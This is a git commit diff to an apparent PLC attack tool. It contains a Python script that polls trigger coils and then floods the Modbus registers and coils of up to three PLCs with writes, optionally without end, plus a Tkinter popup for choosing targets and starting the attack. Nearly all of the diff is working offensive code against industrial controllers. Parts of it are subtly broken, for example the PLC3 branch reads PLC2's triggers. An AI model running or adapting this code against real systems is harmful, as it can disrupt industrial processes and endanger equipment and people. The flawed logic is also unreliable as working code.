3c26395673b55609e3480e748592b35f55d3c096
luca <luca.gugole99@gmail.com>
2023-10-30 13:50:32 +0100

    Fixed bugs. Implementation of attack-config popup window.

--- attacks/dos.py
+++ attacks/dos.py
@@ -1,4 +1,3 @@
-import sys
 import threading
 import configparser
 
@@ -8,25 +7,46 @@ from pymodbus.client.tcp import ModbusTcpClient
 attack_started = False
 
 
+def get_reg_type(register):
+    map_a = {"Q": "C", "M": "H", "I": "I"}
+    return map_a[register[0]]
+
+
+def get_reg_addr(register):
+    address = None
+    if register[1] == "X":
+        if len(register) > 5:
+            address = int(register[5]) + (8 * int(register[2:4]))
+        else:
+            address = int(register[4]) + (8 * int(register[2]))
+    elif register[1] == "W":
+        address = int(register[2:]) + 1024
+    elif register[1] == "D":
+        address = int(register[2:]) + 2048
+    elif register[1] == "L":
+        address = int(register[2:]) + 4096
+    return address
+
+
 def perform_register_attack(client, address, value, packets):
-    print("Writing " + str(value) + " to register %QX0." + str(address))
+    print("Writing " + str(value) + " to register %MX0." + str(address))
     count = 0
-    while count < packets:
-        resp = client.write_register(address, value)
+    while count < packets or packets == -1:
+        resp = client.write_register(address, value, slave=1)
         count += 1
         if resp.isError():
-            print("ERROR writing register %QX0." + str(address), file=sys.stderr)
-    print("Attack to register %QX0." + str(address) + " completed.")
+            print("ERROR writing register %MX0." + str(address))
+    print("Attack to register %MX0." + str(address) + " completed.")
 
 
 def perform_coil_attack(client, address, value, packets):
     print("Writing " + str(value) + " to coil %QX0." + str(address))
     count = 0
-    while count < packets:
+    while count < packets or packets == -1:
         resp = client.write_coil(address, value)
         count += 1
         if resp.isError():
-            print("ERROR writing coil %QX0." + str(address), file=sys.stderr)
+            print("ERROR writing coil %QX0." + str(address))
     print("Attack to coil %QX0." + str(address) + " completed.")
 
 
@@ -77,54 +97,38 @@ def attack(ctx):
 
     #
     # retrieve registers, coils and triggers from PLCs
-    registers_to_attack = {}
-    coils_to_attack = {}
-    triggers_register = {}
+    registers_to_attack = []
+    coils_to_attack = []
+    triggers_register = []
     if "plc1" in prefs:
-        for reg in prefs["plc1"]["registers"]:
-            registers_to_attack[reg] = ctx.register("plc1", 'H', int(reg[4:]))
-        for coil in prefs["plc1"]["coils"]:
-            coils_to_attack[coil] = ctx.register("plc1", 'C', int(coil[4:]))
-            if coil in [x[0] for x in prefs["plc1"]["triggers"]]:
-                triggers_register[coil] = coils_to_attack[coil]
+        registers_to_attack.append(prefs["plc1"]["registers"])
+        coils_to_attack.append((prefs["plc1"]["coils"]))
         for trig in prefs["plc1"]["triggers"]:
-            if not trig[0] in triggers_register.keys():
-                triggers_register[trig[0]] = ctx.register("plc1", 'C', int(trig[0][4:]))
+            triggers_register.append(ctx.register("plc1", get_reg_type(trig[0]), get_reg_addr(trig[0])))
 
     if "plc2" in prefs:
-        for reg in prefs["plc2"]["registers"]:
-            registers_to_attack[reg] = ctx.register("plc2", 'H', int(reg[4:]))
-        for coil in prefs["plc2"]["coils"]:
-            coils_to_attack[coil] = ctx.register("plc2", 'C', int(coil[4:]))
-            if coil in [x[0] for x in prefs["plc2"]["triggers"]]:
-                triggers_register[coil] = coils_to_attack[coil]
+        registers_to_attack.append(prefs["plc2"]["registers"])
+        coils_to_attack.append((prefs["plc2"]["coils"]))
         for trig in prefs["plc2"]["triggers"]:
-            if not trig[0] in triggers_register.keys():
-                triggers_register[trig[0]] = ctx.register("plc2", 'C', int(trig[0][4:]))
+            triggers_register.append(ctx.register("plc2", get_reg_type(trig[0]), get_reg_addr(trig[0])))
 
     if "plc3" in prefs:
-        for reg in prefs["plc3"]["registers"]:
-            registers_to_attack[reg] = ctx.register("plc3", 'H', int(reg[4:]))
-        for coil in prefs["plc3"]["coils"]:
-            coils_to_attack[coil] = ctx.register("plc3", 'C', int(coil[4:]))
-            if coil in [x[0] for x in prefs["plc3"]["triggers"]]:
-                triggers_register[coil] = coils_to_attack[coil]
+        registers_to_attack.append(prefs["plc3"]["registers"])
+        coils_to_attack.append((prefs["plc3"]["coils"]))
         for trig in prefs["plc3"]["triggers"]:
-            if not trig[0] in triggers_register.keys():
-                triggers_register[trig[0]] = ctx.register("plc3", 'C', int(trig[0][4:]))
+            triggers_register.append(ctx.register("plc3", get_reg_type(trig[0]), get_reg_addr(trig[0])))
 
-    print("TARGET REGISTERS: " + str(list(registers_to_attack.keys())))
-    print("TARGET COILS: " + str(list(coils_to_attack.keys())))
+    print("TARGET REGISTERS: " + str(registers_to_attack))
+    print("TARGET COILS: " + str(coils_to_attack))
+    print("TRIGGER COILS: " + str(triggers_register))
 
     #
     # listener that occurs when a register value changes
     def on_value_change(value: int):
         global attack_started
 
-        # in case attack has already started, it stops the polling!
+        # in case attack has already started return
         if attack_started:
-            for c in triggers_register.values():
-                c.stop_polling()
             return
 
         #
@@ -137,77 +141,97 @@ def attack(ctx):
         config.read('config.ini')
         if "plc1" in prefs:
             hp1 = config['plc']['plc1'].split(":")
+            # connect to PLC1
             client1 = ModbusTcpClient(hp1[0], int(hp1[1]))
             client1.connect()
             for tt in prefs["plc1"]["triggers"]:
-                print("Checking value of coil %QX0." + tt[0][4:])
-                response = client1.read_coils(int(tt[0][4:]))
+                print("Checking value of PLC1 coil %QX0." + str(get_reg_addr(tt[0])))
+                response = client1.read_coils(get_reg_addr(tt[0]))
                 coil_val = 1 if response.bits[0] else 0
-                print("Value is " + str(coil_val))
-                triggered = triggered and coil_val == int(tt[1])
+                triggered = triggered and coil_val == int(tt[1])    # checking value
+                print("Value is {}... {}".format(coil_val, ("OK" if triggered else "NO")))
 
         if "plc2" in prefs:
             hp2 = config['plc']['plc2'].split(":")
+            # connect to PLC2
             client2 = ModbusTcpClient(hp2[0], int(hp2[1]))
             client2.connect()
             for tt in prefs["plc2"]["triggers"]:
-                print("Checking value of coil %QX0." + tt[0][4:])
-                response = client2.read_coils(int(tt[0][4:]))
+                print("Checking value of PLC2 coil %QX0." + str(get_reg_addr(tt[0])))
+                response = client2.read_coils(get_reg_addr(tt[0]))
                 coil_val = 1 if response.bits[0] else 0
-                print("Value is " + str(coil_val))
-                triggered = triggered and coil_val == int(tt[1])
+                triggered = triggered and coil_val == int(tt[1])    # checking value
+                print("Value is {}... {}".format(coil_val, ("OK" if triggered else "NO")))
 
         if "plc3" in prefs:
             hp3 = config['plc']['plc3'].split(":")
+            # connect to PLC3
             client3 = ModbusTcpClient(hp3[0], int(hp3[1]))
             client3.connect()
             for tt in prefs["plc2"]["triggers"]:
-                print("Checking value of coil %QX0." + tt[0][4:])
-                response = client3.read_coils(int(tt[0][4:]))
+                print("Checking value of PLC3 coil %QX0." + str(get_reg_addr(tt[0])))
+                response = client3.read_coils(get_reg_addr(tt[0]))
                 coil_val = 1 if response.bits[0] else 0
-                print("Value is " + str(coil_val))
-                triggered = triggered and coil_val == int(tt[1])
+                triggered = triggered and coil_val == int(tt[1])    # checking value
+                print("Value is {}... {}".format(coil_val, ("OK" if triggered else "NO")))
 
         #
-        # attack if the all the conditions are satisfied
+        # attack if all the conditions are satisfied
         if triggered:
-            attack_started = True
-            n_pack = int(prefs["packets"])
-            value = int(prefs["value"]) == 1
             print("Start attack...")
+            attack_started = True
+            n_pack = int(prefs["packets"]) if prefs["packets"] != 'inf' else -1
+            value = int(prefs["value"]) == 1
+
+            # stop listening for the value of the trigger coils.
+            for c in triggers_register:
+                c.stop_polling()
+
+            # start one thread for each target registers and coils in every PLC.
+            thread_list = []
             if client1 is not None:
                 for target in prefs["plc1"]["registers"]:
                     proc_r = threading.Thread(target=perform_register_attack,
-                                              args=(client1, int(target[4:]), value, n_pack))
+                                              args=(client1, get_reg_addr(target), value, n_pack))
+                    thread_list.append(proc_r)
                     proc_r.start()
                 for target in prefs["plc1"]["coils"]:
                     proc_c = threading.Thread(target=perform_coil_attack,
-                                              args=(client1, int(target[4:]), value, n_pack))
+                                              args=(client1, get_reg_addr(target), value, n_pack))
+                    thread_list.append(proc_c)
                     proc_c.start()
 
             if client2 is not None:
                 for target in prefs["plc2"]["registers"]:
                     proc_r = threading.Thread(target=perform_register_attack,
-                                              args=(client2, int(target[4:]), value, n_pack))
+                                              args=(client2, get_reg_addr(target), value, n_pack))
+                    thread_list.append(proc_r)
                     proc_r.start()
                 for target in prefs["plc2"]["coils"]:
                     proc_c = threading.Thread(target=perform_coil_attack,
-                                              args=(client2, int(target[4:]), value, n_pack))
+                                              args=(client2, get_reg_addr(target), value, n_pack))
+                    thread_list.append(proc_c)
                     proc_c.start()
 
             if client3 is not None:
                 for target in prefs["plc3"]["registers"]:
                     proc_r = threading.Thread(target=perform_register_attack,
-                                              args=(client3, int(target[4:]), value, n_pack))
+                                              args=(client3, get_reg_addr(target), value, n_pack))
+                    thread_list.append(proc_r)
                     proc_r.start()
                 for target in prefs["plc3"]["coils"]:
                     proc_c = threading.Thread(target=perform_coil_attack,
-                                              args=(client3, int(target[4:]), value, n_pack))
+                                              args=(client3, get_reg_addr(target), value, n_pack))
+                    thread_list.append(proc_c)
                     proc_c.start()
+
+            for z in thread_list:
+                z.join()
         else:
+            # if conditions are not satisfied yet, wait!
             print("Waiting for a trigger....")
 
     #
     # start the polling of each coil involved in the triggering
-    for reg in triggers_register.values():
+    for reg in triggers_register:
         reg.start_polling(100, on_value_change)
--- gui.py
+++ gui.py
@@ -3,6 +3,8 @@ from subprocess import Popen, PIPE, STDOUT
 from threading import Thread
 from tkinter import *
 from tkinter import ttk
+import configparser
+
 
 class App:
     ATTACK_CMD = ["plc-attack", "-c", "config.ini"]
@@ -16,6 +18,7 @@ class App:
     def __init__(self, master):
         self.master = master
         self.attack = None
+        self.popup = None
 
         self.master.title("PLC Attack")
         self.master.rowconfigure(0, minsize=500, weight=1)
@@ -47,7 +50,7 @@ class App:
         self.btn_frame = Frame(self.action_frame)
         self.btn_frame.grid(row=1, column=0, sticky="ew", pady=5)
 
-        self.btn_start = Button(self.btn_frame, text="Start attack", command=self.start_attack)
+        self.btn_start = Button(self.btn_frame, text="Start attack", command=self.show_config_and_start)
         self.btn_start.grid(row=0, column=0, sticky="ew",padx=5)
         self.btn_stop = Button(self.btn_frame, text="Stop attack", command=self.stop_attack)
         self.btn_stop["state"] = "disabled"
@@ -58,6 +61,31 @@ class App:
         self.text_box = Text(bg="black", fg="white", state='disabled')
         self.text_box.grid(row=0, column=1, sticky="nsew", pady=20, padx=20)
 
+        # plc variables in dos windows
+        self.plc1_use = StringVar()
+        self.plc1_regs = StringVar()
+        self.plc1_coil = StringVar()
+        self.plc1_trig = StringVar()
+
+        self.plc2_use = StringVar()
+        self.plc2_regs = StringVar()
+        self.plc2_coil = StringVar()
+        self.plc2_trig = StringVar()
+
+        self.plc3_use = StringVar()
+        self.plc3_regs = StringVar()
+        self.plc3_coil = StringVar()
+        self.plc3_trig = StringVar()
+
+        self.packets = StringVar()
+        self.value_p = StringVar()
+
+    def show_config_and_start(self):
+        attack_key = self.cbx_attack_selection.get()
+
+        # composing a popup to allow the user to configure the attack
+        if attack_key == 'dos':
+            self.show_dos_config()
 
     def start_attack(self):
         attack_key = self.cbx_attack_selection.get()
@@ -93,6 +121,144 @@ class App:
         if self.attack:
             self.attack.terminate()
         self.master.destroy()
+
+    # function that shows a graphical popup to allow setting the attack configuration
+    def show_dos_config(self):
+        self.popup = Toplevel(self.master)
+        self.popup.title("Attack configuration")
+
+        #
+        # geometry of popup window
+        window_width = 600
+        window_height = 400
+        center_x = int(self.popup.winfo_screenwidth() / 2 - window_width / 2)
+        center_y = int(self.popup.winfo_screenheight() / 2 - window_height / 2)
+        self.popup.geometry(f'{window_width}x{window_height}+{center_x}+{center_y}')
+
+        # grid configuration
+        self.popup.columnconfigure(0, weight=1)
+        self.popup.columnconfigure(1, weight=1)
+        self.popup.columnconfigure(2, weight=1)
+
+        # show title label
+        title_label = ttk.Label(self.popup, text="CONFIGURE YOUR ATTACK", font=('Helvetica', 15, 'bold'))
+        title_label.grid(column=0, row=0, columnspan=3, ipadx=10, ipady=20)
+        separator = ttk.Separator(self.popup, orient='horizontal')
+        separator.grid(column=0, row=1, columnspan=3, sticky=EW)
+
+        # show plc1 labels
+        plc1_label = ttk.Label(self.popup, text="PLC1", font=('Helvetica', 12, 'bold'))
+        plc1_label.grid(column=0, row=2, ipadx=10, ipady=10)
+        plc1_checkbox = ttk.Checkbutton(self.popup, text="Attack", variable=self.plc1_use, onvalue="True", offvalue="False")
+        plc1_checkbox.grid(column=0, row=3)
+
+        plc1_regs_label = ttk.Label(self.popup, text="Target registers:")
+        plc1_regs_label.grid(column=0, row=4)
+        plc1_regs_entry = ttk.Entry(self.popup, textvariable=self.plc1_regs)
+        plc1_regs_entry.grid(column=0, row=5)
+
+        plc1_coils_label = ttk.Label(self.popup, text="Target coils:")
+        plc1_coils_label.grid(column=0, row=6)
+        plc1_coils_entry = ttk.Entry(self.popup, textvariable=self.plc1_coil)
+        plc1_coils_entry.grid(column=0, row=7)
+
+        plc1_trigs_label = ttk.Label(self.popup, text="Triggers:")
+        plc1_trigs_label.grid(column=0, row=8)
+        plc1_trigs_entry = ttk.Entry(self.popup, textvariable=self.plc1_trig)
+        plc1_trigs_entry.grid(column=0, row=9)
+
+        # show plc2 labels
+        plc2_label = ttk.Label(self.popup, text="PLC2", font=('Helvetica', 12, 'bold'))
+        plc2_label.grid(column=1, row=2, ipadx=10, ipady=10)
+        plc2_checkbox = ttk.Checkbutton(self.popup, text="Attack", variable=self.plc2_use, onvalue="True", offvalue="False")
+        plc2_checkbox.grid(column=1, row=3)
+
+        plc2_regs_label = ttk.Label(self.popup, text="Target registers:")
+        plc2_regs_label.grid(column=1, row=4)
+        plc2_regs_entry = ttk.Entry(self.popup, textvariable=self.plc2_regs)
+        plc2_regs_entry.grid(column=1, row=5)
+
+        plc2_coils_label = ttk.Label(self.popup, text="Target coils:")
+        plc2_coils_label.grid(column=1, row=6)
+        plc2_coils_entry = ttk.Entry(self.popup, textvariable=self.plc2_coil)
+        plc2_coils_entry.grid(column=1, row=7)
+
+        plc2_trigs_label = ttk.Label(self.popup, text="Triggers:")
+        plc2_trigs_label.grid(column=1, row=8)
+        plc2_trigs_entry = ttk.Entry(self.popup, textvariable=self.plc2_trig)
+        plc2_trigs_entry.grid(column=1, row=9)
+
+        # show plc3 labels
+        plc3_label = ttk.Label(self.popup, text="PLC3", font=('Helvetica', 12, 'bold'))
+        plc3_label.grid(column=2, row=2, ipadx=10, ipady=10)
+        plc3_checkbox = ttk.Checkbutton(self.popup, text="Attack", variable=self.plc3_use, onvalue="True", offvalue="False")
+        plc3_checkbox.grid(column=2, row=3)
+
+        plc3_regs_label = ttk.Label(self.popup, text="Target registers:")
+        plc3_regs_label.grid(column=2, row=4)
+        plc3_regs_entry = ttk.Entry(self.popup, textvariable=self.plc3_regs)
+        plc3_regs_entry.grid(column=2, row=5)
+
+        plc3_coils_label = ttk.Label(self.popup, text="Target coils:")
+        plc3_coils_label.grid(column=2, row=6)
+        plc3_coils_entry = ttk.Entry(self.popup, textvariable=self.plc3_coil)
+        plc3_coils_entry.grid(column=2, row=7)
+
+        plc3_trigs_label = ttk.Label(self.popup, text="Triggers:")
+        plc3_trigs_label.grid(column=2, row=8)
+        plc3_trigs_entry = ttk.Entry(self.popup, textvariable=self.plc3_trig)
+        plc3_trigs_entry.grid(column=2, row=9)
+
+        # packet info labels
+        pi_frame = ttk.Frame(self.popup)
+        pi_frame.grid(column=0, row=10, columnspan=3, padx=20, pady=20, sticky=W)
+        pi_frame.columnconfigure(0, weight=1)
+        pi_frame.columnconfigure(1, weight=3)
+
+        packets_label = ttk.Label(pi_frame, text="N. of packets:")
+        packets_label.grid(column=0, row=0, sticky=E)
+        packets_entry = ttk.Entry(pi_frame, textvariable=self.packets)
+        packets_entry.grid(column=1, row=0)
+
+        value_label = ttk.Label(pi_frame, text="Value of packets:")
+        value_label.grid(column=0, row=1, sticky=E)
+        value_entry = ttk.Entry(pi_frame, textvariable=self.value_p)
+        value_entry.grid(column=1, row=1)
+
+        # show start button
+        start_button = ttk.Button(self.popup, text="Save and start", command=self.dos_start_button_clicked)
+        start_button.grid(column=1, row=11, padx=10, pady=10)
+
+    def dos_start_button_clicked(self):
+        config = configparser.ConfigParser()
+        config.read('attack_config.ini')
+        config.sections()
+
+        config["plc1"]["use"] = 'False' if self.plc1_use.get() == "" else self.plc1_use.get()
+        config["plc1"]["registers"] = self.plc1_regs.get()
+        config["plc1"]["coils"] = self.plc1_coil.get()
+        config["plc1"]["triggers"] = self.plc1_trig.get()
+
+        config["plc2"]["use"] = 'False' if self.plc2_use.get() == "" else self.plc2_use.get()
+        config["plc2"]["registers"] = self.plc2_regs.get()
+        config["plc2"]["coils"] = self.plc2_coil.get()
+        config["plc2"]["triggers"] = self.plc2_trig.get()
+
+        config["plc3"]["use"] = 'False' if self.plc3_use.get() == "" else self.plc3_use.get()
+        config["plc3"]["registers"] = self.plc3_regs.get()
+        config["plc3"]["coils"] = self.plc3_coil.get()
+        config["plc3"]["triggers"] = self.plc3_trig.get()
+
+        config["general"]["packet_number"] = self.packets.get()
+        config["general"]["packet_value"] = self.value_p.get()
+
+        # write new configuration in attack_config.ini
+        with open('attack_config.ini', 'w') as file_to_write:
+            config.write(file_to_write)
+
+        # close the popup window and start attack
+        self.popup.destroy()
+        self.start_attack()
 
 
 root = Tk()
